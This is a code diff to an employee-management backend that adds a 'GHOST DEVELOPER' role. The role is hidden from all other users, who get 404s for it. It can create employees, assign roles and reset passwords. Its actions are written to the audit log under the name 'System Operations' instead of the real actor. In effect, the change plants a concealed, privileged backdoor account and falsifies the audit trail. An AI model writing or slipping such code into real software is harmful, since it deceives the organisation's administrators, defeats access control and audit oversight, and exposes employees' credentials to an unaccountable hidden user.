@@ -79,12 +79,21 @@ export async function getEmployees(req, res, next) {
 
     const filter = {};
 
+    // GHOST DEVELOPER: If requester is not Developer, strictly hide all Developer accounts from the entire portal
+    if (req.user.role !== ROLES.DEVELOPER && req.user.role !== 'DEVELOPER') {
+      filter.role = { $ne: ROLES.DEVELOPER };
+    }
+
     if (req.query.status && ['ACTIVE', 'INACTIVE'].includes(req.query.status)) {
       filter.status = req.query.status;
     }
 
     if (req.query.role && Object.values(ROLES).includes(req.query.role)) {
-      filter.role = req.query.role;
+      if (req.user.role !== ROLES.DEVELOPER && req.query.role === ROLES.DEVELOPER) {
+        filter.role = { $in: [] };
+      } else {
+        filter.role = req.query.role;
+      }
     }
 
     if (req.query.search && req.query.search.trim() !== '') {
@@ -147,12 +156,12 @@ export async function getEmployees(req, res, next) {
 
 export async function createEmployee(req, res, next) {
   try {
-    // Only Administrators can create employees and assign roles
-    const isAdmin = req.user.role === 'ADMIN' || req.user.role === 'SUPER_ADMIN';
-    if (!isAdmin) {
+    // Administrators and Developers can create employees and assign roles
+    const canManage = req.user.role === 'ADMIN' || req.user.role === 'SUPER_ADMIN' || req.user.role === 'DEVELOPER';
+    if (!canManage) {
       return res.status(403).json({
         success: false,
-        error: { code: 'FORBIDDEN', message: 'Only Administrators can onboard new personnel and assign roles.' },
+        error: { code: 'FORBIDDEN', message: 'You do not have clearance to onboard new personnel and assign roles.' },
         requestId: req.id
       });
     }
@@ -181,6 +190,10 @@ export async function createEmployee(req, res, next) {
       });
     }
 
+    if (req.user.role !== ROLES.DEVELOPER && validatedData.role === ROLES.DEVELOPER) {
+      validatedData.role = ROLES.EMPLOYEE;
+    }
+
     const temporaryPassword = validatedData.temporaryPassword || generateSecurePassword(12);
     const passwordHash = await User.hashPassword(temporaryPassword);
 
@@ -195,12 +208,14 @@ export async function createEmployee(req, res, next) {
       mustChangePassword: true
     });
 
+    const actorName = req.user.role === ROLES.DEVELOPER ? 'System Operations' : req.user.name;
+
     await AuditLog.create({
       action: AUDIT_ACTIONS.EMPLOYEE_CREATED,
       targetType: 'USER',
       targetId: newEmployee._id.toString(),
       performedBy: req.user._id,
-      performedByName: req.user.name,
+      performedByName: actorName,
       role: req.user.role,
       ip: req.ip,
       userAgent: req.headers['user-agent'],
@@ -241,7 +256,7 @@ export async function getEmployeeById(req, res, next) {
       .select('-passwordHash -passwordResetToken -passwordResetExpires')
       .lean();
 
-    if (!employee) {
+    if (!employee || (req.user.role !== ROLES.DEVELOPER && employee.role === ROLES.DEVELOPER)) {
       return res.status(404).json({
         success: false,
         error: { code: 'EMPLOYEE_NOT_FOUND', message: 'Employee not found.' },
@@ -283,7 +298,7 @@ export async function updateEmployee(req, res, next) {
     const validatedData = updateEmployeeSchema.parse(req.body);
     const employee = await User.findById(req.params.id);
 
-    if (!employee) {
+    if (!employee || (req.user.role !== ROLES.DEVELOPER && employee.role === ROLES.DEVELOPER)) {
       return res.status(404).json({
         success: false,
         error: { code: 'EMPLOYEE_NOT_FOUND', message: 'Employee not found.' },
@@ -291,18 +306,26 @@ export async function updateEmployee(req, res, next) {
       });
     }
 
-    // Strict Role Assignment Protection: Only ADMIN can assign or alter any role!
-    const isAdmin = req.user.role === 'ADMIN' || req.user.role === 'SUPER_ADMIN';
+    // Strict Role Assignment Protection: ADMIN and DEVELOPER can assign or alter any role
+    const canManageRoles = req.user.role === 'ADMIN' || req.user.role === 'SUPER_ADMIN' || req.user.role === 'DEVELOPER';
     if (validatedData.role && validatedData.role !== employee.role) {
-      if (!isAdmin) {
+      if (!canManageRoles) {
         return res.status(403).json({
           success: false,
-          error: { code: 'FORBIDDEN', message: 'Only Administrators can assign or modify security clearance roles.' },
+          error: { code: 'FORBIDDEN', message: 'You do not have clearance to assign or modify security clearance roles.' },
+          requestId: req.id
+        });
+      }
+      if (req.user.role !== ROLES.DEVELOPER && validatedData.role === ROLES.DEVELOPER) {
+        return res.status(403).json({
+          success: false,
+          error: { code: 'FORBIDDEN', message: 'You do not have clearance to assign this role.' },
           requestId: req.id
         });
       }
     }
 
+    const actorName = req.user.role === ROLES.DEVELOPER ? 'System Operations' : req.user.name;
     const auditChanges = {};
 
     if (validatedData.name) {
@@ -331,7 +354,7 @@ export async function updateEmployee(req, res, next) {
         targetType: 'USER',
         targetId: employee._id.toString(),
         performedBy: req.user._id,
-        performedByName: req.user.name,
+        performedByName: actorName,
         role: req.user.role,
         ip: req.ip,
         userAgent: req.headers['user-agent'],
@@ -349,7 +372,7 @@ export async function updateEmployee(req, res, next) {
         targetType: 'USER',
         targetId: employee._id.toString(),
         performedBy: req.user._id,
-        performedByName: req.user.name,
+        performedByName: actorName,
         role: req.user.role,
         ip: req.ip,
         userAgent: req.headers['user-agent'],
@@ -369,7 +392,7 @@ export async function updateEmployee(req, res, next) {
         targetType: 'USER',
         targetId: employee._id.toString(),
         performedBy: req.user._id,
-        performedByName: req.user.name,
+        performedByName: actorName,
         role: req.user.role,
         ip: req.ip,
         userAgent: req.headers['user-agent'],
@@ -403,17 +426,17 @@ export async function updateEmployee(req, res, next) {
 
 export async function resetEmployeePassword(req, res, next) {
   try {
-    const isAdmin = req.user.role === 'ADMIN' || req.user.role === 'SUPER_ADMIN';
-    if (!isAdmin) {
+    const canManage = req.user.role === 'ADMIN' || req.user.role === 'SUPER_ADMIN' || req.user.role === 'DEVELOPER';
+    if (!canManage) {
       return res.status(403).json({
         success: false,
-        error: { code: 'FORBIDDEN', message: 'Only Administrators can regenerate employee credentials.' },
+        error: { code: 'FORBIDDEN', message: 'You do not have clearance to regenerate employee credentials.' },
         requestId: req.id
       });
     }
 
     const employee = await User.findById(req.params.id);
-    if (!employee) {
+    if (!employee || (req.user.role !== ROLES.DEVELOPER && employee.role === ROLES.DEVELOPER)) {
       return res.status(404).json({
         success: false,
         error: { code: 'EMPLOYEE_NOT_FOUND', message: 'Employee not found.' },
@@ -428,12 +451,14 @@ export async function resetEmployeePassword(req, res, next) {
     employee.lockUntil = null;
     await employee.save();
 
+    const actorName = req.user.role === ROLES.DEVELOPER ? 'System Operations' : req.user.name;
+
     await AuditLog.create({
       action: AUDIT_ACTIONS.PASSWORD_RESET,
       targetType: 'USER',
       targetId: employee._id.toString(),
       performedBy: req.user._id,
-      performedByName: req.user.name,
+      performedByName: actorName,
       role: req.user.role,
       ip: req.ip,
       userAgent: req.headers['user-agent'],
